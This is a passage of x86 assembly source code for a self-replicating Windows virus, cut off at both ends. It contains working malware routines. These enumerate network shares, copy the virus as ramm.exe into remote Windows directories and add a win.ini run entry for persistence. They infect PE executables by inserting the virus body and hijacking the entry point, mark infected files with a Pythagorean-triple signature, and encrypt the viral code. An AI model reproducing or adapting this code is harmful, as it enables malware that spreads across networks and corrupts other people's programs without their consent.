       sub ebp, offset @Thread6Delta               ;
                                                   ;
       IF NETWORKINFECTION                         ;
       cmp [ebp+netapis], FALSE                    ;
       je exit_netcrawl                            ;
                                                   ;
       IF THREAD6SEH                               ;
       lea eax, [ebp+Thread6Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       call NetInfection C, 0                      ;
       jmp done_net                                ;
                                                   ;
NetInfection proc C lpnr:DWORD                     ;
                                                   ;
local lpnrLocal :DWORD                             ;
local hEnum     :DWORD                             ;
local ceEntries :DWORD                             ;
local cbBuffer  :DWORD                             ;
                                                   ;
       pusha                                       ;
       call get_new_delta                          ;
get_new_delta:                                     ;
       pop edx                                     ;
       sub edx, offset get_new_delta               ;
                                                   ;
       mov [ceEntries], 0FFFFFFFFh                 ;as many entries as poss.
       mov [cbBuffer], 4000                        ;memory buffer size
       lea eax, [hEnum]                            ;handle to enumeration
       mov esi, [lpnr]                             ;parameter
       call [edx+_WNetOpenEnumA], RESOURCE_CONNECTED,\ ;open the enumeration
                           RESOURCETYPE_ANY, 0,\   ;
                           esi, eax                ;
                                                   ;
       or eax, eax                                 ;failed?
       jnz exit_net                                ;
                                                   ;
       call [edx+_GlobalAlloc], GPTR, cbBuffer     ;allocate memory
       or eax, eax                                 ;
       jz exit_net                                 ;
       mov [lpnrLocal], eax                        ;save memory handle
                                                   ;
enumerate:                                         ;
       lea eax, cbBuffer                           ;enumerate all the
       push eax                                    ;resources
       mov esi, [lpnrLocal]                        ;
       push esi                                    ;
       lea eax, ceEntries                          ;
       push eax                                    ;
       push hEnum                                  ;
       call [edx+_WNetEnumResourceA]               ;
                                                   ;
       or eax, eax                                 ;failed?
       jnz free_mem                                ;
                                                   ;
       mov ecx, [ceEntries]                        ;how many entries?
       or ecx, ecx                                 ;
       jz enumerate                                ;
                                                   ;
roam_net:                                          ;
       push ecx esi                                ;
                                                   ;
       mov eax, [esi.dwType]                       ;is it a disk resource?
       test eax, RESOURCETYPE_DISK                 ;
       jz get_next_entry                           ;
                                                   ;
       mov edi, [esi.lpRemoteName]                 ;get remote name
       mov esi, [esi.lpLocalName]                  ;get local name
       or esi, esi                                 ;empty?
       jz no_good_name                             ;
                                                   ;
       cmp word ptr [esi],0041                     ;is it a floppy disk?
       jz no_good_name                             ;
                                                   ;
       call RemoteInfection                        ;try to infect it!
                                                   ;
no_good_name:                                      ;
       pop esi                                     ;
                                                   ;
       mov eax, [esi.dwUsage]                      ;do we have a container?
       test eax, RESOURCEUSAGE_CONTAINER           ;
       jz get_next_entry                           ;
                                                   ;
       push esi                                    ;
       call NetInfection                           ;recurse!!
                                                   ;
get_next_entry:                                    ;
       add esi, 20h                                ;next resource!
       pop ecx                                     ;
       loop roam_net                               ;
                                                   ;
       jmp enumerate                               ;and next enumeration...
                                                   ;
free_mem:                                          ;
       call [edx+_GlobalFree], [lpnrLocal]         ;free the memory
                                                   ;
       call [edx+_WNetCloseEnum], [hEnum]          ;and close enumeration.
                                                   ;
exit_net:                                          ;
       popa                                        ;
       ret                                         ;
NetInfection endp                                  ;
                                                   ;
RemoteInfection proc                               ;
       pusha                                       ;
       call @___1                                  ;restore the delta handle
@___1:                                             ;
       pop ebp                                     ;
       sub ebp, offset @___1                       ;
                                                   ;
       push 260                                    ;get the current file
       lea eax, [ebp+myname]                       ;name
       push eax                                    ;
       push 0                                      ;
       call [ebp+_GetModuleFileNameA]              ;
       or eax, eax                                 ;
       jz cannot_roam                              ;
                                                   ;
       lea esi, [ebp+windirs]                      ;point windows dir names
                                                   ;
test_paths:                                        ;
       lea ebx, [ebp+droppername]                  ;copy path for dropper
       call [ebp+_lstrcpy], ebx, edi               ;
       lea ebx, [ebp+winininame]                   ;copy path for win.ini
       call [ebp+_lstrcpy], ebx, edi               ;
                                                   ;
       lea ebx, [ebp+droppername]                  ;copy windows dir
       call [ebp+_lstrcat], ebx, esi               ;
       lea eax, [ebp+drop]                         ;and dropper name
       call [ebp+_lstrcat], ebx, eax               ;
                                                   ;
       push TRUE                                   ;now copy ourself over
       push ebx                                    ;the LAN under the new
       lea eax, [ebp+myname]                       ;name into the remote
       push eax                                    ;windows directory
       call [ebp+_CopyFileA]                       ;
       or eax, eax                                 ;
       jz test_next                                ;
                                                   ;
       lea ebx, [ebp+winininame]                   ;copy the windows dir name
       call [ebp+_lstrcat], ebx, esi               ;to the win.ini path
       lea eax, [ebp+winini]                       ;
       call [ebp+_lstrcat], ebx, eax               ;and it's name
                                                   ;
       lea eax, [ebp+winininame]                   ;Now create this entry
       push eax                                    ;into the win.ini file:
       lea eax, [ebp+droppername]                  ;
       push eax                                    ;[Windows]
       lea eax, [ebp+cmd]                          ;run=c:\windows\ramm.exe
       push eax                                    ;
       inc esi                                     ;
       push esi                                    ;
       call [ebp+_WritePrivateProfileStringA]      ;
       jmp cannot_roam                             ;
                                                   ;
test_next:                                         ;
       @endsz                                      ;go and try the next
       cmp byte ptr [esi], 0fh                     ;windows path!
       jne test_paths                              ;
                                                   ;
cannot_roam:                                       ;
       popa                                        ;
       ret                                         ;
                                                   ;
smash_dropper proc                                 ;this procedure acts like
       pusha                                       ;this:
       push 260                                    ;if the file ramm.exe
       call ramm_name                              ;exists in the windows dir
r_n:   db 260 dup(0)                               ;and there is no entry
ramm_name:                                         ;to run it at next boot
       call [ebp+_GetWindowsDirectoryA]            ;in the win.ini file, then
                                                   ;it will erase the file.
       lea edx, [ebp+r_n]                          ;if the file ramm.exe
       push edx                                    ;does not exist, but there
       call [ebp+_lstrlen]                         ;is an entry in the win
       mov edi, eax                                ;ini file, then it will
                                                   ;remove the entry.
       lea eax, [ebp+drop]                         ;If both are present
       push eax                                    ;they are left alone.
       lea edx, [ebp+r_n]                          ;
       push edx                                    ;
       call [ebp+_lstrcat]                         ;
                                                   ;
       lea eax, [ebp+W32FD]                        ;locate ramm.exe
       push eax                                    ;
       push edx                                    ;
       call [ebp+_FindFirstFileA]                  ;
       mov [ebp+ok], 0                             ;
       cmp eax, INVALID_HANDLE_VALUE               ;
       je no_file                                  ;
       mov [ebp+ok], 1                             ;
                                                   ;
no_file:                                           ;
       lea edx, [ebp+r_n]                          ;save name
       lea eax, [ebp+droppername]                  ;
       push edx                                    ;
       push eax                                    ;
       call [ebp+_lstrcpy]                         ;
                                                   ;
       mov byte ptr [edx+edi], 0                   ;
       lea eax, [ebp+winini]                       ;
       push eax                                    ;
       push edx                                    ;
       call [ebp+_lstrcat]                         ;
                                                   ;open win.ini
       push 0                                      ;
       push 0                                      ;
       push OPEN_EXISTING                          ;
       push 0                                      ;
       push 0                                      ;
       push GENERIC_READ + GENERIC_WRITE           ;
       push edx                                    ;
       call [ebp+_CreateFileA]                     ;
       inc eax                                     ;
       jz no_need                                  ;
       dec eax                                     ;
       mov [ebp+hfile], eax                        ;
                                                   ;
       push 0                                      ;
       push eax                                    ;
       call [ebp+_GetFileSize]                     ;
       mov [ebp+filesize], eax                     ;
                                                   ;
       push 0                                      ;
       push [ebp+filesize]                         ;
       push 0                                      ;
       push PAGE_READWRITE                         ;
       push 0                                      ;
       push [ebp+hfile]                            ;
       call [ebp+_CreateFileMappingA]              ;
                                                   ;
       or eax, eax                                 ;
       jz no_need_1                                ;
       mov [ebp+hmap], eax                         ;
                                                   ;
       push [ebp+filesize]                         ;
       push 0                                      ;
       push 0                                      ;
       push FILE_MAP_ALL_ACCESS                    ;
       push [ebp+hmap]                             ;
       call [ebp+_MapViewOfFile]                   ;
                                                   ;
       or eax, eax                                 ;
       jz no_need_2                                ;
       mov [ebp+haddress], eax                     ;
                                                   ;
       mov ecx, [ebp+filesize]                     ;
       sub ecx, 8                                  ;
                                                   ;
src_loop:                                          ;
       cmp dword ptr [eax]  , 'mmar'               ;search "ramm.exe"
       jne no_ramm                                 ;
       cmp dword ptr [eax+4], 'exe.'               ;
       je found_ramm                               ;
                                                   ;
no_ramm:                                           ;
       inc eax                                     ;
       loop src_loop                               ;
                                                   ;
       lea eax, [ebp+droppername]                  ;
       push eax                                    ;
       call [ebp+_DeleteFileA]                     ;
       jmp kill_memo                               ;
                                                   ;
found_ramm:                                        ;
       cmp [ebp+ok], 0                             ;
       jne kill_memo                               ;
                                                   ;
       mov edx, eax                                ;
       add edx, 8                                  ;
                                                   ;
rep_for_run:                                       ;
       cmp [eax], "=nur"                           ;search backwards for
       je finished_searching                       ;"run="
       dec eax                                     ;
       cmp eax, [ebp+haddress]                     ;
       je kill_memo                                ;
       jmp rep_for_run                             ;
                                                   ;
finished_searching:                                ;
       mov edi, eax                                ;put blanks over it!
       mov al, " "                                 ;
       mov ecx, edx                                ;
       sub ecx, edi                                ;
       rep stosb                                   ;
                                                   ;
kill_memo:                                         ;
       push [ebp+haddress]                         ;close win.ini!
       call [ebp+_UnmapViewOfFile]                 ;
                                                   ;
no_need_2:                                         ;
       push [ebp+hmap]                             ;
       call [ebp+_CloseHandle]                     ;
                                                   ;
no_need_1:                                         ;
       push [ebp+hfile]                            ;
       call [ebp+_CloseHandle]                     ;
                                                   ;
no_need:                                           ;
       popa                                        ;
       ret                                         ;
smash_dropper endp                                 ;
                                                   ;
windirs db "\Windows", 0                           ;
        db "\WinNT"  , 0                           ;
        db "\Win"    , 0                           ;
        db "\Win95"  , 0                           ;
        db "\Win98"  , 0                           ;
        db 0fh                                     ;
                                                   ;
winini  db "\Win.ini" , 0                          ;
drop    db "\ramm.exe", 0                          ;
cmd     db "run"      , 0                          ;
                                                   ;
myname      db 260 dup(0)                          ;
droppername db 260 dup(0)                          ;
winininame  db 260 dup(0)                          ;
RemoteInfection endp                               ;
                                                   ;
done_net:                                          ;
       IF THREAD6SEH                               ;
       jmp restore_thread6_seh                     ;host
                                                   ;
Thread6Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover6                          ;
DeltaRecover6:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover6               ;
                                                   ;
restore_thread6_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       ENDIF                                       ;
                                                   ;
exit_netcrawl:                                     ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
Thread_6_StartAddress endp                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
OurThreads dd offset Thread_1_StartAddress         ;
           dd offset Thread_2_StartAddress         ;
           dd offset Thread_3_StartAddress         ;
           dd offset Thread_4_StartAddress         ;
           dd offset Thread_5_StartAddress         ;
           dd offset Thread_6_StartAddress         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
ReturnToHost:                                      ;
       jmp restore_seh                             ;host
                                                   ;
ExceptionExit:                                     ;if we had an error we
       IF DEBUG                                    ;
          call MessageBoxA, 0, offset err, offset err, 0
          jmp go_over                              ;
          err db 'SEH Error!', 0                   ;
          go_over:                                 ;
       ELSE                                        ;
       ENDIF                                       ;
       mov esp, [esp+8]                            ;must restore the ESP
                                                   ;
restore_seh:                                       ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;returning to the host...
                                                   ;
       db 0BDh                                     ;restore delta handle
delta  dd 0                                        ;
                                                   ;
       cmp [ebp+firstgen], 1                       ;
       je generation0_exit                         ;
                                                   ;
       IF APIHOOK                                  ;if api hook is on we
apicheck:                                          ;cannot return to host
       cmp [ebp+apihookfinish], 1                  ;until the hooking is
       jne apicheck                                ;done...
       ENDIF                                       ;
                                                   ;
       mov eax, 12345678h                          ;mov eax, oledip
oldeip equ $-4                                     ;
       add eax, 12345678h                          ;add eax, imagebase
adjust equ $-4                                     ;
       mov dword ptr [ebp+savedeax], eax           ;
       popa                                        ;
                                                   ;
       push 12345678h                              ;
savedeax equ $-4                                   ;
       ret                                         ;
                                                   ;
generation0_exit:                                  ;
       push 0                                      ;
       call [ebp+_ExitProcess]                     ;
                                                   ;
InfectFile proc                                    ;
       pusha                                       ;save regs
       mov [ebp+flag], 1                           ;mark success flag
       mov [ebp+filename], edi                     ;save filename
       mov esi, edi                                ;
       call ValidateFile                           ;
       jc failed_infection                         ;
                                                   ;
       call [ebp+_GetFileAttributesA], edi         ;get attributes
       mov [ebp+fileattributes], eax               ;and save them
       call [ebp+_SetFileAttributesA], edi, FILE_ATTRIBUTE_NORMAL; and set
                                                   ;them normal
       call [ebp+_CreateFileA], edi, GENERIC_READ+GENERIC_WRITE, 0, 0,\
                         OPEN_EXISTING, 0, 0       ;open file
       cmp eax, INVALID_HANDLE_VALUE               ;
       je finished                                 ;
       mov [ebp+hfile], eax                        ;
                                                   ;
       mov [ebp+fileopen], TRUE                    ;
                                                   ;
       lea ebx, [ebp+filetime1]                    ;save file time
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       call [ebp+_GetFileTime], eax                ;
                                                   ;
       call [ebp+_GetFileSize], [ebp+hfile], 0     ;get file size
       mov [ebp+filesize], eax                     ;
       add eax, virussize + 1000h                  ;
       mov [ebp+additional], eax                   ;save additional length
                                                   ;
       call [ebp+_CreateFileMappingA], [ebp+hfile], 0, PAGE_READWRITE,\
                                       0, [ebp+additional], 0
       or eax, eax                                 ;create mapping object
       je close_file                               ;
                                                   ;
       mov [ebp+hmap], eax                         ;
                                                   ;
       call [ebp+_MapViewOfFile], [ebp+hmap], FILE_MAP_ALL_ACCESS, 0, 0,\
                           [ebp+additional]        ;map file!
       or eax, eax                                 ;
       je close_map                                ;
                                                   ;
       mov [ebp+haddress], eax                     ;save address of mapping
       mov esi, eax                                ;
                                                   ;
       mov ax, word ptr [esi]                      ;check exe sign
       xor ax, '⁄ﬂ'                                ;
       cmp ax, 'ZM' xor '⁄ﬂ'                       ;
       jne close_address                           ;
                                                   ;
       call InitCopro                              ;check infection mark
       fild word ptr [esi.MZ_oeminfo]              ;this is number a
       fild word ptr [esi.MZ_oeminfo]              ;
       fmul                                        ;
       call RestoreCopro                           ;
       add esp, 4                                  ;
                                                   ;
       mov esi, [esi.MZ_lfanew]                    ;get pointer to pe header
       cmp esi, 1000h                              ;
       ja close_address                            ;
       add esi, [ebp+haddress]                     ;
                                                   ;
       call [ebp+_IsBadReadPtr], esi, 1000h        ;check readability
       or eax, eax                                 ;
       jnz close_address                           ;
                                                   ;
       mov [ebp+peheader], esi                     ;save pe header
                                                   ;
       mov ax, word ptr [esi]                      ;check if pe file
       xor ax, 'ı'                                ;
       cmp ax, 'EP' xor 'ı'                       ;
       jne close_address                           ;
                                                   ;
       test word ptr [esi.Characteristics], IMAGE_FILE_DLL; be sure it's not
       jnz close_address                           ;a library
                                                   ;
       lea edi, [ebp+pedata]                       ;
       xor eax, eax                                ;
       mov ax, [esi.NumberOfSections]              ;save number of sections
       stosd                                       ;
       mov ax, [esi.SizeOfOptionalHeader]          ;save optional header
       stosd                                       ;
       add esi, IMAGE_FILE_HEADER_SIZE             ;get to the optional head.
       mov [ebp+optionalheader], esi               ;
                                                   ;
       cmp word ptr [esi.OH_MajorImageVersion], 0  ;
       je skip_check                               ;
       cmp word ptr [esi.OH_MinorImageVersion], 0  ;
       je skip_check                               ;
       call InitCopro                              ;
       fild word ptr [esi.OH_MajorImageVersion]    ;this is number b
       fild word ptr [esi.OH_MajorImageVersion]    ;
       fmul                                        ;
       fild word ptr [esi.OH_MinorImageVersion]    ;this is number c
       fild word ptr [esi.OH_MinorImageVersion]    ;
       fmul                                        ;
       fadd                                        ;
       fsub                                        ;here is b^2+c^2-a^2
       fldz                                        ;is it 0?
       fcompp                                      ;compare them
       fstsw ax                                    ;get status word
       call RestoreCopro                           ;
       add esp, 4                                  ;
       sahf                                        ;load flags with it
       jz close_address                            ;is it already infected?
                                                   ;
skip_check:                                        ;
       cmp [esi.OH_Subsystem], IMAGE_SUBSYSTEM_NATIVE; check if it is not
       je close_address                            ;a driver...
                                                   ;
       mov eax, [esi.OH_AddressOfEntryPoint]       ;save entry eip
       stosd                                       ;
       mov eax, [esi.OH_ImageBase]                 ;imagebase
       stosd                                       ;
       mov eax, [esi.OH_SectionAlignment]          ;section align
       stosd                                       ;
       mov eax, [esi.OH_FileAlignment]             ;file align
       stosd                                       ;
       mov eax, [esi.OH_SizeOfImage]               ;size of image
       stosd                                       ;
       mov eax, [esi.OH_SizeOfHeaders]             ;headers size
       stosd                                       ;
       mov eax, [esi.OH_CheckSum]                  ;and checksum
       stosd                                       ;
       mov eax, [esi.OH_NumberOfRvaAndSizes]       ;save number of dirs..
       stosd                                       ;
       mov eax, [esi.OH_BaseOfCode]                ;and base of code
       stosd                                       ;
                                                   ;
       add esi, [ebp+sizeofoptionalheader]         ;mov to first sec header
       mov ecx, [ebp+numberofsections]             ;
                                                   ;
scan_for_code:                                     ;
       mov eax, [esi.SH_VirtualAddress]            ;get the RVA
       cmp eax, [ebp+baseofcode]                   ;is it the code section?
       jae found_code_section                      ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;no... get next...
       loop scan_for_code                          ;
       jmp close_address                           ;
                                                   ;
found_code_section:                                ;
       mov [ebp+codesectionheader], esi            ;save code section ptr
       mov [ebp+codesectionrva], eax               ;
       mov ebx, [esi.SH_PointerToRawData]          ;
       mov [ebp+codesectionraw], ebx               ;
       mov ebx, [esi.SH_VirtualSize]               ;
       mov eax, [esi.SH_SizeOfRawData]             ;
       call choose_smaller                         ;
       mov [ebp+codesectionsize], ebx              ;
                                                   ;
                                                   ;
       IF APIHOOK                                  ;
       pusha                                       ;
       mov esi, [ebp+optionalheader]               ;
       mov ecx, [ebp+numberofsections]             ;
       mov ebx, [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       or ebx, ebx                                 ;
       jz over_import                              ;
       add esi, [ebp+sizeofoptionalheader]         ;
                                                   ;
scan_for_imports:                                  ;
       mov eax, [esi.SH_VirtualAddress]            ;get the RVA
       cmp eax, ebx                                ;is it the import section?
       je found_import                             ;
       jb maybe_found                              ;
       jmp search_next_import                      ;
                                                   ;
maybe_found:                                       ;
       add eax, [esi.SH_VirtualSize]               ;
       cmp eax, ebx                                ;
       ja found_import                             ;
                                                   ;
search_next_import:                                ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;no... get next...
       loop scan_for_imports                       ;
       jmp no_import_found                         ;
                                                   ;
found_import:                                      ;enable write on the
       or [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE; imports, credits to
       mov [ebp+no_imports], TRUE                  ;Bumblebee for this.
       jmp over_import                             ;
                                                   ;
no_import_found:                                   ;
       mov [ebp+no_imports], FALSE                 ;
                                                   ;
over_import:                                       ;
       popa                                        ;
       ENDIF                                       ;
       call locate_last_section_stuff              ;locate stuff in the last
                                                   ;section
       call add_new_section                        ;add a new section
       jnc ok_go_with_it                           ;
                                                   ;
       call increase_last_section                  ;
       mov edi, [ebp+finaldestination]             ;
       jmp do_virus_movement                       ;
                                                   ;
ok_go_with_it:                                     ;
       mov eax, [esi.SH_SizeOfRawData]             ;get the 2 sizes and be
       cmp eax, virussize                          ;sure we are smaller then
       jb set_method_1                             ;both of them...
       mov eax, [esi.SH_VirtualSize]               ;
       cmp eax, virussize                          ;
       jb set_method_1                             ;
                                                   ;
size_is_ok:                                        ;
       cmp eax, virussize                          ;do we fit into the code
       jb set_method_1                             ;section?
                                                   ;
       mov [ebp+method], METHOD_MOVE_CODE          ;if yes, move the code...
                                                   ;
       mov ecx, 5                                  ;
                                                   ;
establish_home:                                    ;
       mov esi, [ebp+codesectionheader]            ;
       mov eax, [esi.SH_SizeOfRawData]             ;
       mov ebx, [esi.SH_VirtualSize]               ;
       call choose_smaller                         ;
       mov ebx, [esi.SH_PointerToRawData]          ;get pointer to data
       mov [ebp+codesectionraw], ebx               ;save it...
       mov esi, ebx                                ;get a delta difference
       IF RANDOMIZE_ENTRY                          ;
       sub eax, virussize                          ;to place us in and
       dec eax                                     ;randomize it...
       call brandom32                              ;
       ELSE                                        ;                                    ;
       mov eax, 1                                  ;
       ENDIF                                       ;
       mov [ebp+codedelta], eax                    ;from where we start?
                                                   ;
       call check_intersection                     ;are we intersecting with
       jnc continue_process                        ;other directories?
       loop establish_home                         ;if yes, try again!
                                                   ;
       jmp set_method_1                            ;if cannot find place move
                                                   ;at end!
                                                   ;
continue_process:                                  ;
       add esi, eax                                ;
       add esi, [ebp+haddress]                     ;
       push esi                                    ;
       mov edi, [ebp+last_section_destination]     ;save our destination...
       add edi, [ebp+haddress]                     ;
       call [ebp+_IsBadWritePtr], edi, virussize   ;can we write?
       or eax, eax                                 ;
       jnz close_address                           ;
       call move_virus_size                        ;move the original code
       pop edi                                     ;from here...
       mov [ebp+finaldestination], edi             ;save the destination of
                                                   ;code
do_virus_movement:                                 ;
       cmp [ebp+method], METHOD_INCREASE_LAST      ;
       jne not_increase_last                       ;
       mov eax, [ebp+last_section_destination]     ;
       sub eax, [ebp+lastsectionraw]               ;
       add eax, [ebp+lastsectionrva]               ;
       jmp set_it                                  ;
                                                   ;
not_increase_last:                                 ;
       cmp [ebp+method], METHOD_APPEND_AT_END      ;
       jne not_at_end                              ;
       mov eax, [ebp+lastsectionrva]               ;
       jmp set_it                                  ;
                                                   ;
not_at_end:                                        ;
       mov eax, [ebp+codesectionrva]               ;
       add eax, [ebp+codedelta]                    ;
                                                   ;
set_it:                                            ;
       add eax, (ourpoint-start)-1                 ;
       mov dword ptr [ebp+ourpoint+1], eax         ;for imagebase getter
                                                   ;
       mov eax, [ebp+last_section_destination]     ;here is a raw ptr in the
       sub eax, [ebp+lastsectionraw]               ;last section. Substract
       add eax, [ebp+lastsectionrva]               ;raw pointer and add virt
       mov dword ptr [ebp+codesource], eax         ;pointer to get a RVA
       mov eax, [ebp+finaldestination]             ;same crap on destination
       sub eax, [ebp+haddress]                     ;
       sub eax, [ebp+codesectionraw]               ;
       add eax, [ebp+codesectionrva]               ;
       mov dword ptr [ebp+codedestin], eax         ;
                                                   ;
       mov [ebp+copying], 1                        ;syncronization
       mov ecx, 100d                               ;
       loop $                                      ;
                                                   ;
       lea esi, [ebp+start]                        ;move virus now in the
       call move_virus_size                        ;code place...
       mov [ebp+copying], 0                        ;
                                                   ;
       mov eax, [ebp+addressofentrypoint]          ;save old eip
       mov edi, [ebp+finaldestination]             ;
       mov [edi+offset oldeip-offset start], eax   ;
                                                   ;
       mov esi, [ebp+codesectionheader]            ;
       or [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE+IMAGE_SCN_MEM_READ
       jmp continue                                ;make code writable
                                                   ;
set_method_1:                                      ;
       mov [ebp+method], METHOD_APPEND_AT_END      ;here we append the virus
                                                   ;at the end...
       mov edi, [ebp+last_section_destination]     ;
       add edi, [ebp+haddress]                     ;
       mov [ebp+finaldestination], edi             ;
       call [ebp+_IsBadWritePtr], edi, virussize   ;can we write?
       or eax, eax                                 ;
       jnz close_address                           ;
       jmp do_virus_movement                       ;
                                                   ;
continue:                                          ;
       call check_not                              ;check lists
       mov eax, [ebp+finaldestination]             ;
       add eax, (offset firstgen-offset start)     ;zero the first gen mark
       mov dword ptr [eax], 0                      ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;now align size of image
       mov eax, [ebp+sizeofimage]                  ;to the section alignment
       add eax, [ebp+newsize]                      ;
       cmp eax, [ebp+totalsizes]                   ;
       jb sizeofimage_ok                           ;
                                                   ;
       call align_to_sectionalign                  ;
       mov [esi.OH_SizeOfImage], eax               ;
                                                   ;
sizeofimage_ok:                                    ;
       mov eax, [ebp+filesize]                     ;align the filesize to
       add eax, [ebp+newsize]                      ;the file alignment
       call align_to_filealign                     ;
       mov [ebp+filesize], eax                     ;
                                                   ;
       cmp [ebp+method], METHOD_APPEND_AT_END      ;
       je alternate                                ;
       cmp [ebp+method], METHOD_INCREASE_LAST      ;
       je alternate2                               ;
       mov eax, [ebp+finaldestination]             ;get our final destination
       sub eax, [ebp+haddress]                     ;substract current map
       sub eax, [ebp+codesectionraw]               ;
       add eax, [ebp+codesectionrva]               ;
       jmp set_eip                                 ;
                                                   ;
alternate2:                                        ;
       pusha                                       ;
       mov esi, [ebp+lastsectionheader]            ;
       mov eax, [esi.SH_VirtualSize]               ;
       xchg eax, [esi.SH_SizeOfRawData]            ;
       mov [esi.SH_VirtualSize], eax               ;
       popa                                        ;
                                                   ;
       mov eax, [ebp+last_section_destination]     ;
       sub eax, [ebp+lastsectionraw]               ;
       add eax, [ebp+lastsectionrva]               ;
       call EPO_Routine                            ;
       jnc set_epo                                 ;
       jmp set_eip                                 ;
                                                   ;
alternate:                                         ;
       mov eax, [ebp+lastsectionrva]               ;
       call EPO_Routine                            ;
       jnc set_epo                                 ;
       jmp set_eip                                 ;
                                                   ;
set_epo:                                           ;
       pusha                                       ;
       mov ebx, [ebp+addressofentrypoint]          ;
       mov edx, ebx                                ;
       add ebx, [ebp+codesectionraw]               ;
       sub ebx, [ebp+codesectionrva]               ;
       add ebx, [ebp+haddress]                     ;
       sub eax, edx                                ;
       sub eax, 5                                  ;
       mov edx, dword ptr [ebx]                    ;
       mov ecx, dword ptr [ebx+4]                  ;
       mov byte ptr [ebx], 0e9h                    ;
       mov dword ptr [ebx+1], eax                  ;
       mov eax, [ebp+finaldestination]             ;
       add eax, (offset saved_code-offset start)   ;
       mov [eax], edx                              ;
       mov [eax+4], ecx                            ;
       popa                                        ;
       jmp mark_infection                          ;
                                                   ;
set_eip:                                           ;
       mov [esi.OH_AddressOfEntryPoint], eax       ;address and save eip RVA
                                                   ;
mark_infection:                                    ;
       mov eax, 100d                               ;get random pythagora's
       call brandom32                              ;numbers roots
       mov word ptr [ebp+m], ax                    ;m
       mov eax, 100d                               ;
       call brandom32                              ;
       mov word ptr [ebp+n], ax                    ;n
                                                   ;
       call InitCopro                              ;
       fild word ptr [ebp+n]                       ;load the root numbers
       fild word ptr [ebp+m]                       ;
       fild word ptr [ebp+n]                       ;
       fild word ptr [ebp+m]                       ;
       fmul st, st(2)                              ;M*M
       fincstp                                     ;
       fmul st, st(2)                              ;N*N
       fdecstp                                     ;
       fadd st, st(1)                              ;M*M + N*N
       fist word ptr [ebp+a]                       ;store it to a
       fsub st, st(1)                              ;
       fsub st, st(1)                              ;
       fabs                                        ;|M*M - N*N|
       fist word ptr [ebp+c]                       ;store it to c
       fincstp                                     ;
       fincstp                                     ;
       fmul                                        ;
       fimul word ptr [ebp+two]                    ;2*M*N
       fist word ptr [ebp+b]                       ;store it to b
       call RestoreCopro                           ;Now a^2 = b^2 + c^2
       add esp, 4                                  ;
                                                   ;
       push esi                                    ;mark infection!
       mov esi, [ebp+haddress]                     ;
       mov ax, [ebp+a]                             ;
       mov word ptr [esi.MZ_oeminfo], ax           ;
       mov ax, [ebp+b]                             ;
       pop esi                                     ;
       mov word ptr [esi.OH_MajorImageVersion], ax ;
       mov ax, [ebp+c]                             ;
       mov word ptr [esi.OH_MinorImageVersion], ax ;
                                                   ;
       mov eax, [ebp+sizeofheaders]                ;rearrange size of headers
       mov [esi.OH_SizeOfHeaders], eax             ;
                                                   ;
       mov esi, [ebp+peheader]                     ;
                                                   ;
       cmp [ebp+method], METHOD_INCREASE_LAST      ;
       je no_need_to_increase                      ;
       inc word ptr [esi.NumberOfSections]         ;
                                                   ;
no_need_to_increase:                               ;
       IF CHECKSUM                                 ;
       mov eax, [esi.OH_CheckSum]                  ;
       or eax, eax                                 ;
       jz no_checksum                              ;
                                                   ;
       mov ebx, [ebp+checksumfile]                 ;
       or ebx, ebx                                 ;
       jz no_checksum                              ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       mov eax, [esi.OH_CheckSum]                  ;
       or eax, eax                                 ;
       jz no_checksum                              ;
       lea eax, [esi.OH_CheckSum]                  ;
       push eax                                    ;
       lea eax, [ebp+offset headersum]             ;
       push eax                                    ;
       push [ebp+filesize]                         ;
       push [ebp+haddress]                         ;
       call ebx                                    ;
       ELSE                                        ;
       mov esi, [ebp+optionalheader]               ;
       xor eax, eax                                ;
       mov [esi.OH_CheckSum], eax                  ;
       ENDIF                                       ;
                                                   ;
no_checksum:                                       ;
       mov esi, [ebp+finaldestination]             ;our internal encryptor
       add esi, (EncryptedArea - start)            ;
       mov edi, esi                                ;
       mov ecx, (end2-EncryptedArea)               ;
                                                   ;
EncryptLoop:                                       ;
       lodsb                                       ;
       mov ebx, ecx                                ;
       inc bl                                      ;
       jp _parity                                  ;
       rol al, cl                                  ;
       jmp do_encrypt                              ;
                                                   ;
_parity:                                           ;
       ror al, cl                                  ;
                                                   ;
do_encrypt:                                        ;
       stosb                                       ;
       loop EncryptLoop                            ;
                                                   ;
       jmp infection_succesfull                    ;success!!! ;-)
                                                   ;
       m   dw 0                                    ;
       n   dw 0                                    ;
       a   dw 0                                    ;
       b   dw 0                                    ;
       c   dw 0                                    ;
       two dw 2                                    ;
                                                   ;
move_virus_size:                                   ;this moves as many bytes
       mov ecx, virussize                          ;as the virus size is..
       rep movsb                                   ;
       ret                                         ;
                                                   ;

;I found out today a very important thing... Some of the pe files inside
;the windows directory have a certain particularity that requires special
;care... That is some of the directories present in the DataDirectory have
